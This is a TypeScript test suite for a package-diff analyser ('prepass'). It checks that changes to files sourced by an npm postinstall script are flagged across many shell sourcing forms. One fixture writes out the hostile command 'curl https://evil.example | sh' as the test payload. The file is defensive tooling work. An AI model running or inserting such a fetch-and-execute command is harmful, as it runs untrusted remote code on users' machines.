import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const shE = (body: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": "N=ok\n" + body + "./tools/$N.sh\n",
  "tools/ok.sh": "true\n",
  "docs/env": "N=../docs/run\n",
  "docs/run.sh": "true\n",
  "README.md": "a\n",
});

// A `.` or `source` word with an argument, quotes and backslashes removed,
// clears safe names. That includes `then .`, `"source"`, and `eval '. ./file'`.
const cases: [string, string][] = [
  ["S1 sh if/then . file", "if true; then . ./docs/env; fi\n"],
  ["S2 sh { . file; }", "{ . ./docs/env; }\n"],
  ["S3 sh builtin . file", "builtin . ./docs/env\n"],
  ["S4 sh command . file", "command . ./docs/env\n"],
  ["S5 sh \\. file", "\\. ./docs/env\n"],
  ["S6 sh \"source\" file", "\"source\" ./docs/env\n"],
  ["S7 sh X=1 . file", "X=1 . ./docs/env\n"],
  ["S8 sh eval . file", "eval '. ./docs/env'\n"],
  ["S9 sh case arm . file", "case x in x) . ./docs/env;; esac\n"],
  ["S10 sh time . file", "time . ./docs/env\n"],
  ["S11 sh ! . file", "! . ./docs/env\n"],
  ["S12 sh while loop . file", "while true; do . ./docs/env; break; done\n"],
];

for (const [name, body] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    const base = shE(body);
    holds(base, "docs/run.sh", sh);
    expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
  });
}
